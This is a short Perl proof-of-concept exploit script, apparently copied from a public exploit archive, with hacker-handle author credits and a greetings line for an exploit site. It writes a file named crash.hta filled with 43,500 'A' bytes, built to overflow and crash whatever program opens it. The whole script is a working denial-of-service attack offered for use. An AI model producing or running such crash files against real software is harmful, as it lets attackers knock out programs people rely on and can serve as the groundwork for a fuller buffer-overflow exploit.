#!/usr/bin/perl
print " Author: anT!-Tr0J4n      \n";
print " Greetz :http://inj3ct0r.com    ; \n";
print "Home : www.Dev-PoinT.com ; \n";
 
my $junk= "\x41" x 43500 ;
open(file,">crash.hta");
print file $junk ;
close(file);